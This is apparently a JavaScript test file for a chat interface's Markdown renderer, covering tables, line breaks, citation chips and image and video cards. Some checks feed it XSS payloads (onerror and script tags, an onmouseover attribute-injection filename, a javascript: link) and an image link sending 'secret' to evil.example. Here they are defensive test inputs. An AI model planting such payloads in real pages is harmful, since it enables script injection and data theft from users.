/**
 * The Markdown renderer, on the shapes chat models actually emit.
 *
 * Tables are the whole reason this file exists. A model writes a bold lead-in
 * line and then a table directly under it with no blank line between — which is
 * valid Markdown and is what every one of them does — and the renderer printed
 * the pipes as text. It happened because a table was recognised only at the top
 * of the block loop, so the paragraph gatherer below reached it first and ate it.
 */

import { renderMarkdown, escapeHtml } from '../public/js/markdown.js';

let failures = 0;
const section = (name) => console.log(`\n\x1b[1m${name}\x1b[0m`);
function check(what, ok, note = '') {
  if (!ok) failures += 1;
  console.log(`  ${ok ? '\x1b[32m✓\x1b[0m' : '\x1b[31m✗\x1b[0m'}  ${what}${note ? ` — ${note}` : ''}`);
}

/* ── the bug in the screenshot ─────────────────────────────────── */

section('a table written straight under a line of text');
{
  // Copied from a real reply: a bold lead-in, then the table, no blank line.
  const html = renderMarkdown(
    ['**Trong đời thực:**', '| Tình huống | Câu mở đầu |', '|---|---|', '| Ở bar/party | "Bài này hay quá" |'].join(
      '\n',
    ),
  );

  check('is a table, not a paragraph of pipes', html.includes('<table>'), html.slice(0, 80));
  check('the lead-in stays its own paragraph', html.includes('<p><strong>Trong đời thực:</strong></p>'));
  check('the header row is a header', html.includes('<th>Tình huống</th>'));
  check('the body row is a body row', html.includes('<td>Ở bar/party</td>'));
  check('and no raw pipe survives', !html.includes('|'), html.slice(0, 120));
}

section('and one written under a bullet');
{
  const html = renderMarkdown(['- Bước một:', '| A | B |', '|---|---|', '| 1 | 2 |'].join('\n'));
  check('the bullet ends where the table starts', html.includes('<li>Bước một:</li>'));
  check('and the table is a table', html.includes('<table>') && html.includes('<td>1</td>'), html.slice(0, 100));
}

section('with a blank line, as before');
{
  const html = renderMarkdown(['Trước.', '', '| A | B |', '| --- | --- |', '| 1 | 2 |', '', 'Sau.'].join('\n'));
  check('still works', html.includes('<table>'));
  check('and the paragraphs either side survive', html.includes('<p>Trước.</p>') && html.includes('<p>Sau.</p>'));
}

/* ── the shapes models write ───────────────────────────────────── */

section('tables models actually emit');
{
  const bare = renderMarkdown(['Metric | Old | New', '--- | --- | ---', 'Documents | 408 | 275'].join('\n'));
  check('no outer pipes at all', bare.includes('<th>Metric</th>') && bare.includes('<td>275</td>'), bare.slice(0, 90));

  const aligned = renderMarkdown(['| Left | Mid | Right |', '|:---|:---:|---:|', '| a | b | c |'].join('\n'));
  check('alignment is honoured', aligned.includes('style="text-align:center"'), aligned.slice(0, 160));
  check('right too', aligned.includes('style="text-align:right"'));

  // A row shorter than the header used to lose its last column silently, which
  // is worse than an empty cell because the table still looks correct.
  const ragged = renderMarkdown(['| A | B | C |', '|---|---|---|', '| 1 | 2 |'].join('\n'));
  check('a short row is padded, not truncated', (ragged.match(/<td/g) || []).length === 3, ragged.slice(-90));

  const escaped = renderMarkdown(['| Cột | Ghi chú |', '|---|---|', '| a \\| b | ống |'].join('\n'));
  check('an escaped pipe stays in its cell', escaped.includes('<td>a | b</td>'), escaped.slice(-80));

  // Inline formatting inside cells, which is most of what a table is for.
  const rich = renderMarkdown(['| Mục | Giá trị |', '|---|---|', '| **đậm** | `mã` |'].join('\n'));
  check('cells are formatted, not printed raw', rich.includes('<strong>đậm</strong>') && rich.includes('<code>mã</code>'));
}

/* ── the second bug in the screenshot ──────────────────────────── */

section('a line break inside a cell');
{
  // GFM has no multi-line table cell, so every model writes <br> to stack
  // lines inside one — exactly what the screenshot showed printed as raw text.
  const html = renderMarkdown(['| Việc |', '|---|', '| 40-50 words<br>• 10 phút |'].join('\n'));
  check('<br> becomes a real break, not text', html.includes('40-50 words<br>• 10 phút'), html.slice(-90));
  check('and the raw tag is gone', !html.includes('&lt;br'), html.slice(-90));

  // The self-closing shapes a model also writes.
  const slash = renderMarkdown(['| A |', '|---|', '| one<br/>two<br />three |'].join('\n'));
  check('<br/> and <br /> too', (slash.match(/<br>/g) || []).length === 2, slash.slice(-70));

  // It works in ordinary prose as well, and this is the guard that matters:
  // only <br> is let back through — no other tag escapes escaping.
  const prose = renderMarkdown('line one<br>line two, and <script>alert(1)</script>');
  check('a break in prose is honoured', prose.includes('line one<br>line two'), prose.slice(0, 80));
  check('but nothing else is un-escaped', prose.includes('&lt;script&gt;'), prose.slice(0, 120));

  // A <br> written inside inline code stays literal — code is verbatim.
  const code = renderMarkdown('use `<br>` to break');
  check('a <br> inside code stays literal', code.includes('<code>&lt;br&gt;</code>'), code.slice(0, 80));
}

section('and things that only look like tables');
{
  const prose = renderMarkdown(['Chọn a | b tuỳ ý.', '-----------'].join('\n'));
  check('a sentence with a pipe is not a table', !prose.includes('<table>'), prose.slice(0, 90));

  const rule = renderMarkdown(['Trước.', '---', 'Sau.'].join('\n'));
  check('a rule under a paragraph ends it', rule.includes('<p>Trước.</p>') && rule.includes('<hr />'), rule);
}

/* ── the thing this renderer must never do ─────────────────────── */

section('nothing a model writes becomes markup');
{
  const html = renderMarkdown('| <img src=x onerror=alert(1)> | b |\n|---|---|\n| <script>x</script> | d |');
  check('a tag in a cell is text', !html.includes('<img') && !html.includes('<script>'), html.slice(0, 120));
  check('and it is still a table', html.includes('<table>'));
  check('escapeHtml is what does it', escapeHtml('<b>&"\'') === '&lt;b&gt;&amp;&quot;&#39;');
}

/* ── attribute position, which is where the real bug was ──────── */

section('escaping is safe in an attribute, not only in text');
{
  // The bug this pins: app.js and onboarding.js each had their own escaper,
  // written as "set textContent on a div, read innerHTML back". That
  // serialisation escapes & < > and *not* quotes — which is correct between
  // tags, and an attribute injection everywhere else. Both files build HTML
  // strings with values in
  // double-quoted attributes: an attachment's filename, a paired machine's
  // hostname, a workspace path the user typed. A filename ending the title=
  // attribute early put a live event handler on the element, running with the
  // full authority of the session.
  //
  // Verified in Chromium at the time of the fix: with the old escaper the
  // rendered span carried an onmouseover attribute; with this one it does not.
  const payload = 'invoice" onmouseover="PWNED';
  const escaped = escapeHtml(payload);

  check('a double quote cannot close the attribute', !escaped.includes('"'), escaped);
  check('it becomes an entity instead', escaped.includes('&quot;'));
  check('a single quote is escaped too', escapeHtml("it's") === 'it&#39;s');
  check('so the payload is inert', escapeHtml(payload) === 'invoice&quot; onmouseover=&quot;PWNED');
  // The round trip has to still be right, or the fix would break every filename.
  check('and the text still reads back unchanged', escaped.replaceAll('&quot;', '"') === payload);

  // Null and undefined reach this from optional fields; the old div-based
  // version turned them into the strings 'null' and 'undefined'.
  check('null becomes empty, not the word null', escapeHtml(null) === '');
  check('undefined too', escapeHtml(undefined) === '');
}

/* ── citations ─────────────────────────────────────────────────── */

section('a page cited in parentheses becomes a source chip');
{
  const html = renderMarkdown('Tối đa 100 MiB mỗi tệp. ([OpenRouter](https://openrouter.ai/docs/guides/features/files-api))');
  check('is a chip', html.includes('class="cite"'), html.slice(0, 160));
  check('named after the site', html.includes('<span class="cite__name">OpenRouter</span>'));
  check('with the site logo from our own server', html.includes('src="/api/favicon/openrouter.ai"'));
  check('the card links to the exact address', html.includes('href="https://openrouter.ai/docs/guides/features/files-api"'));
  check('no +N for a single source', !html.includes('cite__more'));
  check('and no raw brackets left', !html.includes('[OpenRouter]'));
}

section('four sources, two sharing a site: one chip, three logos, +3');
{
  const html = renderMarkdown(
    'Giới hạn 20 request/phút. ([OpenRouter](https://openrouter.ai/a), [OpenRouter](https://openrouter.ai/b), [Reddit](https://www.reddit.com/r/x), [Zendesk](https://help.zendesk.com/y))',
  );
  const chips = html.match(/class="cite"/g) || [];
  const marks = html.match(/<span class="cite__marks"[^>]*>(.*?)<\/span>/)?.[1] || '';
  check('one chip for the run', chips.length === 1, String(chips.length));
  check('+3 counts every other source', html.includes('>+3<'));
  check('one logo per site, not per page', (marks.match(/<img/g) || []).length === 3, marks);
  check('all four listed in the card', (html.match(/class="cite-item"/g) || []).length === 4);
}

section('adjacent groups merge, and a repeated address is one source');
{
  const html = renderMarkdown('Câu. ([A](https://a.com/x)) ([A](https://a.com/x)) ([B](https://b.com/))');
  check('one chip', (html.match(/class="cite"/g) || []).length === 1);
  check('+1, not +2', html.includes('>+1<'), html.match(/cite__more">[^<]*/)?.[0]);
}

section('files: the kind as the name, one icon per kind, not a link');
{
  const html = renderMarkdown('Theo tài liệu. ([Chap005- Introduction Risk and Return.pdf], [Tong_hop_DTTC.docx], [Ghi chu.doc])');
  check('named by the first file\'s type', html.includes('cite__name--file">PDF<'));
  check('+2', html.includes('>+2<'));
  const marks = html.match(/<span class="cite__marks"[^>]*>(.*?)<\/span>/)?.[1] || '';
  check('a .docx and a .doc share the Word icon', (marks.match(/<svg/g) || []).length === 2, marks.slice(0, 120));
  check('the file name is in the card', html.includes('Chap005- Introduction Risk and Return.pdf'));
  check('a file source is not a link', !/<a [^>]*cite-item[^>]*>[^]*Tong_hop/.test(html));
  check('an underscore in a name is not italics', !html.includes('<em>'));
}

section('a project source cited the way the grounding rules ask: bare brackets, with a page');
{
  // Copied from a real reply.
  const html = renderMarkdown('**Khủng hoảng tài chính 2008** [SLIDE-DTTC_Gốc.txt, tr.32–46]:');
  check('is a chip', (html.match(/class="cite"/g) || []).length === 1, html.slice(0, 160));
  check('no raw brackets left', !html.includes('[SLIDE'), html.slice(0, 160));
  check('the colon after it stays', /<\/span>:<\/p>$/.test(html), html.slice(-40));
  check('the page range is in the card', html.includes('<span class="cite-item__where">tr.32–46</span>'));
  check('named by its type', html.includes('cite__name--file">TXT<'));

  const two = renderMarkdown('Có bộ trắc nghiệm [TESTBANK-DTTC.pdf]. Giáo trình [SLIDE-DTTC_Gốc.txt, tr.12] và [đề 1.pdf, tr.2].');
  check('each bare citation is its own chip', (two.match(/class="cite"/g) || []).length === 3, String((two.match(/class="cite"/g) || []).length));

  const merged = renderMarkdown('Khớp [SLIDE.txt, tr.19–46], [đề 1.pdf, tr.2; TESTBANK.pdf].');
  check('adjacent ones merge into one chip', (merged.match(/class="cite"/g) || []).length === 1);
  check('three sources, so +2', merged.includes('>+2<'), merged.match(/cite__more">[^<]*/)?.[0]);

  const samePages = renderMarkdown('x [a.pdf, tr.1] [a.pdf, tr.9]');
  check('the same file at two places is two sources', samePages.includes('>+1<'));
}

section('other ways models cite');
{
  const paren = renderMarkdown('Giáo trình là Bodie (SLIDE-DTTC_Gốc.txt, tr.12).');
  check('a file with a page in plain parentheses', paren.includes('class="cite"') && paren.includes('cite-item__where">tr.12<'), paren.slice(0, 200));
  check('and the full stop after it stays', /<\/span>\.<\/p>$/.test(paren), paren.slice(-30));

  const pages = renderMarkdown('x (Chap005.pdf, p. 3; notes.docx, slide 4)');
  check('two in one pair of parentheses', pages.includes('>+1<'));

  const domain = renderMarkdown('Theo [openrouter.ai](https://openrouter.ai/docs/files-api), tối đa 100 MiB.');
  check('a link whose words are a domain is a source', domain.includes('class="cite"') && domain.includes('cite__name">openrouter.ai<'));
}

section('numbered notes, Perplexity style, against a Sources list');
{
  const html = renderMarkdown(
    [
      'Tối đa 100 MiB mỗi tệp [1][2]. Free plan 50 request/ngày [3].',
      '',
      '**Nguồn:**',
      '1. [Files API - OpenRouter](https://openrouter.ai/docs/files-api)',
      '2. [Upload a file](https://openrouter.ai/docs/api/upload)',
      '3. Reddit — https://www.reddit.com/r/SillyTavernAI/x',
    ].join('\n'),
  );
  const chips = html.match(/class="cite"/g) || [];
  check('two chips, one per run of numbers', chips.length === 2, String(chips.length));
  check('[1][2] is one chip, +1', html.includes('>+1<'));
  check('named from the list', html.includes('cite__name">Files API - OpenRouter<'));
  check('a bare address in the list works too', html.includes('href="https://www.reddit.com/r/SillyTavernAI/x"'));
  check('its words before the address become the name', html.includes('cite__name">Reddit<'), html.match(/cite__name">[^<]*/g)?.join(' | '));
  check('no bare [1] left in the text', !/\[\d\]/.test(html.replace(/<span class="cite__card"[^]*?<\/span><\/span>/g, '')));
  check('the list itself stays visible', html.includes('<ol>'));
}

section('numbered notes as definitions, and footnotes');
{
  const html = renderMarkdown(
    ['Khủng hoảng 2008 [^1] và Glass-Steagall [2, 3].', '', '[^1]: SLIDE-DTTC_Gốc.txt, tr.32–46', '[2]: https://en.wikipedia.org/wiki/Glass–Steagall_legislation "Glass–Steagall"', '[3]: Bodie, Kane, Marcus, Investments, 10th ed.'].join('\n'),
  );
  check('a footnote to a file is a file chip', html.includes('cite-item__where">tr.32–46<'));
  check('a definition with a quoted title uses it', html.includes('cite__name">Glass–Steagall<'));
  check('a note with no link or file still shows', html.includes('cite-item--note') && html.includes('Bodie, Kane, Marcus'));
  check('used definitions are not printed again', !html.includes('[2]:') && !html.includes('[^1]:'));

  const undefinedNote = renderMarkdown('Theo [4] thì sao.\n\n[1]: https://a.com');
  check('a number with no definition is left as written', undefinedNote.includes('[4]') && !undefinedNote.includes('class="cite"'));
  check('and a definition nothing points at stays visible', undefinedNote.includes('https://a.com'));

  const range = renderMarkdown('x [1–3].\n\n[1]: https://a.com\n[2]: https://b.com\n[3]: https://c.com');
  check('a range [1–3] is three sources', range.includes('>+2<'));

  const partial = renderMarkdown('x [1][9].\n\n[1]: https://a.com');
  check('a run with one undefined number is left whole', partial.includes('[1][9]') && !partial.includes('class="cite"'));

  const code = renderMarkdown('```\narr[1]: x\n```\n\nitems[1] is fine.');
  check('an index into an array is not a note', !code.includes('class="cite"'));
}

section('introduced sources, bare addresses, OpenAI markers, dashes, odd addresses');
{
  const lead = renderMarkdown('Tối đa 100 MiB (Nguồn: [OpenRouter](https://openrouter.ai/docs)).');
  check('"(Nguồn: [X](url))" is a chip', lead.includes('class="cite"') && !lead.includes('Nguồn:'), lead.slice(0, 120));

  const theo = renderMarkdown('Như vậy (theo [Reddit](https://reddit.com/r/x), [Zendesk](https://z.com/a)).');
  check('"(theo …, …)" too, with +1', theo.includes('>+1<'));

  const bare = renderMarkdown('Giới hạn 20 request/phút (https://openrouter.ai/docs/limits).');
  check('an address alone in parentheses is a chip named by its site', bare.includes('cite__name">openrouter.ai<'), bare.slice(0, 160));

  const openai = renderMarkdown('Theo tài liệu 【4:0†Chap005.pdf】 thì…');
  check('OpenAI\'s 【†file】 marker is a file chip', openai.includes('cite__name--file">PDF<') && !openai.includes('【'));

  const dash = renderMarkdown('x [Chap005.pdf – tr.12]');
  check('a page after a dash', dash.includes('cite-item__where">tr.12<'), dash.slice(0, 200));

  const wiki = renderMarkdown('x ([Wikipedia](https://en.wikipedia.org/wiki/Lehman_(bank)))');
  check('an address with parentheses in it is kept whole', wiki.includes('href="https://en.wikipedia.org/wiki/Lehman_(bank)"'), wiki.match(/href="[^"]*"/)?.[0]);

  const upper = renderMarkdown('x [BAO-CAO.PDF] [bao-cao.pdf]');
  check('upper-case extensions, and case does not make two files', upper.includes('cite__name--file">PDF<') && !upper.includes('cite__more'));

  const kinds = renderMarkdown('x [a.ods] [b.odp] [c.svg] [d.ipynb]');
  check('less common kinds are recognised too', (kinds.match(/class="cite"/g) || []).length === 1 && kinds.includes('>+3<'));
}

section('what looks like a citation but is not one');
{
  check('an ordinary aside in parentheses', !renderMarkdown('Kết quả (tăng 20%) là tốt.').includes('class="cite"'));
  check('a Markdown task list', !renderMarkdown('- [ ] a\n- [x] b').includes('class="cite"'));
  check('a link inside a sentence with a lead-in word', !renderMarkdown('Xem thêm [tài liệu](https://a.com/docs) nhé.').includes('class="cite"'));
  check('a file named in parentheses without a place in it is prose', !renderMarkdown('(xem report.pdf)').includes('class="cite"'));
  check('nor with a comma and ordinary words', !renderMarkdown('(report.pdf, bản mới nhất)').includes('class="cite"'));
  check('an ordinary link with words stays a link', !renderMarkdown('[trang chủ OpenRouter](https://openrouter.ai)').includes('class="cite"'));
  check('a file name as link text stays a link', !renderMarkdown('[report.pdf](https://a.com/r.pdf)').includes('class="cite"'));
  check('a checkbox is not a file', !renderMarkdown('- [x] done').includes('class="cite"'));
  check('brackets around words are left alone', !renderMarkdown('see [note 1] below').includes('class="cite"'));
  check('a file named in code is left alone', !renderMarkdown('`[a.pdf]`').includes('class="cite"'));
}

section('a link that is part of the sentence stays a link');
{
  const html = renderMarkdown('Xem [tài liệu Files API](https://openrouter.ai/docs) để biết thêm.');
  check('no chip', !html.includes('class="cite"'));
  check('an ordinary link', html.includes('<a href="https://openrouter.ai/docs"'));
}

section('a numbered note cannot smuggle markup either');
{
  const html = renderMarkdown(
    ['a [1] b [2] c [3]', '', '[1]: <img src=x onerror=alert(1)>', '[2]: https://a.com/"onmouseover="y "t<b>"', '[3]: javascript:alert(1)'].join('\n'),
  );
  check('no live tag from a note', !/<img src=x/.test(html) && !html.includes('<b>'));
  check('no attribute break-out from a note address', !/"onmouseover="/.test(html));
  check('a javascript: note is text, never a link', !/href="javascript/i.test(html));
}

section('a citation cannot smuggle markup');
{
  const html = renderMarkdown('x ([<img src=x onerror=alert(1)>](https://a.com/"onmouseover="y))');
  check('no live tag', !html.includes('<img src=x'));
  check('no attribute break-out', !/"onmouseover="/.test(html));
}

section('a PDF sent as its text still shows as a PDF');
{
  const html = renderMarkdown('x [SLIDE-DTTC_Gốc.pdf.txt, tr.12]');
  check('named by the document it was', html.includes('cite__name--file">PDF<'), html.match(/cite__name[^>]*>[^<]*/)?.[0]);
  check('with the PDF icon', html.includes('cite__file--pdf'));
  check('and a plain .txt is still text', renderMarkdown('x [notes.txt]').includes('cite__name--file">TXT<'));
}

section('whether a cited source was actually in front of the assistant');
{
  const { fileWasSeen, pageWasSeen, rememberSearch } = await import('../public/js/cite.js');
  const seen = { files: ['SLIDE-DTTC_Gốc.pdf.txt', 'TESTBANK-DTTC.pdf'], text: 'search_docs → found in Q3 report.docx' };
  check('a file that was given', fileWasSeen('TESTBANK-DTTC.pdf', seen));
  check('regardless of case', fileWasSeen('testbank-dttc.PDF', seen));
  check('a PDF sent as text, cited as the .txt or as the PDF', fileWasSeen('SLIDE-DTTC_Gốc.txt', seen) && fileWasSeen('SLIDE-DTTC_Gốc.pdf', seen));
  check('Vietnamese written in either Unicode form', fileWasSeen('SLIDE-DTTC_Gốc.pdf', seen));
  check('a file a tool found', fileWasSeen('Q3 report.docx', seen));
  check('a file nobody gave is not', !fileWasSeen('Chap005.pdf', seen));
  check('and nothing is marked while the shelf is unknown', fileWasSeen('Chap005.pdf', { files: null, text: '' }));

  rememberSearch('1. Rate limits\n   https://openrouter.ai/docs/limits\n   20 requests per minute.');
  check('a page from a search', pageWasSeen('https://openrouter.ai/docs/limits/', { text: '' }));
  check('a page the person pasted', pageWasSeen('https://vnexpress.net/a-123.html', { text: 'đọc giúp tôi https://vnexpress.net/a-123.html' }));
  check('a page never searched, read or given is not', !pageWasSeen('https://made-up.example/paper', { text: 'nothing here' }));
}

section('the card learns titles and summaries from a search the tab saw');
{
  const { rememberSearch, knownSource } = await import('../public/js/cite.js');
  const { formatResults } = await import('../server/search.js');
  rememberSearch(
    formatResults('openrouter file limit', {
      engine: 'Test',
      attempts: [],
      results: [
        { title: 'Files API - Upload and Manage Workspace Files', url: 'https://openrouter.ai/docs/files-api', snippet: 'The maximum file size is 100 MiB.', published: '2026-08-25' },
        { title: 'Giới hạn mới của Openrouter', url: 'https://www.reddit.com/r/SillyTavernAI/x', snippet: '' },
      ],
    }),
  );
  const a = knownSource('https://openrouter.ai/docs/files-api/');
  check('title kept, trailing slash or not', a?.title === 'Files API - Upload and Manage Workspace Files', JSON.stringify(a));
  check('summary kept, the date line left out', a?.snippet === 'The maximum file size is 100 MiB.', a?.snippet);
  const b = knownSource('https://www.reddit.com/r/SillyTavernAI/x');
  check('a result with no summary still has its title', b?.title === 'Giới hạn mới của Openrouter' && !b.snippet);
}

section('pictures and videos in a reply');
{
  const signed = '/api/image?u=https%3A%2F%2Fshop.example%2Fsvj.jpg&s=abcDEF_123-xyz';
  const row = renderMarkdown(`Here they are:\n\n![SVJ 63 coupe](${signed})\n![SVJ roadster](${signed.replace('svj', 'svj2')})\n\nThat is all.`);
  check('pictures on their own lines become one row', (row.match(/class="mdgallery"/g) || []).length === 1 && (row.match(/mdgallery__item/g) || []).length === 2, row.slice(0, 200));
  check('  each with its caption', /mdgallery__cap">SVJ 63 coupe</.test(row));
  check('  and the prose around them stays prose', /<p>Here they are:<\/p>/.test(row) && /<p>That is all\.<\/p>/.test(row));
  const outside = renderMarkdown('![leak](https://evil.example/?d=secret)');
  check('an address the server did not sign is never fetched as a picture', !/<img/.test(outside) && /<a href="https:\/\/evil\.example/.test(outside), outside);
  const inline = renderMarkdown(`See ![x](${signed}) here.`);
  check('a signed picture inside a sentence is drawn inline', /<img class="mdimg" src="\/api\/image\?u=/.test(inline), inline);
  check('  with its signature intact', inline.includes('s=abcDEF_123-xyz'));

  const video = renderMarkdown('[Tardis SVJ review](https://www.youtube.com/watch?v=dQw4w9WgXcQ)');
  check('a YouTube link on its own line is a video card', /class="mdvideo" data-yt="dQw4w9WgXcQ"/.test(video), video.slice(0, 160));
  check('  with its title and a thumbnail through this server', /Tardis SVJ review/.test(video) && /\/api\/image\?u=https%3A%2F%2Fi\.ytimg\.com%2Fvi%2FdQw4w9WgXcQ/.test(video));
  const two = renderMarkdown('- https://youtu.be/dQw4w9WgXcQ\n- [Second](https://www.youtube.com/shorts/abcdefghijk)');
  check('a list of videos is a row of cards', /class="mdvideos"/.test(two) && (two.match(/class="mdvideo"/g) || []).length === 2, two.slice(0, 160));
  const sentence = renderMarkdown('Watch https://www.youtube.com/watch?v=dQw4w9WgXcQ later.');
  check('a video link inside a sentence stays a link', !/mdvideo/.test(sentence) && /<a href=/.test(sentence));
  check('a bad id is not a video', !/mdvideo/.test(renderMarkdown('https://www.youtube.com/watch?v=<script>')));
}

console.log(
  failures ? `\n\x1b[31m${failures} check(s) failed.\x1b[0m\n` : '\n\x1b[32mAll markdown checks passed.\x1b[0m\n',
);
process.exit(failures ? 1 : 0);
